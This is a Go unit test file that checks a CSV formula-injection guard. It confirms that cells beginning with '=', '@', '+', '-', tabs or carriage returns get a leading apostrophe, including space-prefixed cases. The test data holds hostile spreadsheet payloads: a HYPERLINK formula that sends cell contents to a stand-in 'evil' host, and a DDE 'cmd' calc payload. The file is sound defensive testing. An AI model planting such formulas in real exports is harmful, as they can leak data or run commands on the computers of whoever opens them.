package services

import "testing"

// TestCSVGuard pins the spreadsheet formula-injection neutralization (security-audit W4-1):
// cells that Excel/Sheets would interpret as formulas get a leading apostrophe; plain numbers
// (including negatives) and ordinary text pass through untouched.
func TestCSVGuard(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"empty", "", ""},
		{"plain text", "Acme Corp", "Acme Corp"},
		{"vietnamese", "Công ty TNHH ABC", "Công ty TNHH ABC"},
		{"formula equals", `=HYPERLINK("http://evil/?"&A1,"x")`, `'=HYPERLINK("http://evil/?"&A1,"x")`},
		{"formula at", "@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"dde pipe", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
		{"leading tab", "\tpayload", "'\tpayload"},
		{"leading cr", "\rpayload", "'\rpayload"},
		{"negative number untouched", "-100", "-100"},
		{"negative decimal untouched", "-3.50", "-3.50"},
		{"positive number untouched", "+42", "+42"},
		{"minus formula", "-2+3+cmd", "'-2+3+cmd"},
		{"plus formula", "+SUM(A1)", "'+SUM(A1)"},
		{"json object", `{"amount":"1.00"}`, `{"amount":"1.00"}`},
		// A leading space is not a defence: importers that trim on load evaluate the formula, and
		// the guard used to inspect s[0] and wave these through.
		{"space-prefixed formula", ` =HYPERLINK("http://evil/",1)`, `' =HYPERLINK("http://evil/",1)`},
		{"space-prefixed at", "  @SUM(A1:A9)", "'  @SUM(A1:A9)"},
		{"space-prefixed minus formula", " -2+3+cmd", "' -2+3+cmd"},
		{"space-padded number still untouched", " -100", " -100"},
		{"blanks only", "   ", "   "},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvGuard(tc.in); got != tc.want {
				t.Errorf("csvGuard(%q) = %q; want %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestCSVCell_GuardsStrings confirms csvCell applies the guard on the string path (the cell type
// tenant data actually flows through) while numeric renders stay raw.
func TestCSVCell_GuardsStrings(t *testing.T) {
	if got := csvCell("=1+1"); got != "'=1+1" {
		t.Errorf("csvCell string = %q; want %q", got, "'=1+1")
	}
	if got := csvCell(float64(-100)); got != "-100" {
		t.Errorf("csvCell float = %q; want %q", got, "-100")
	}
}
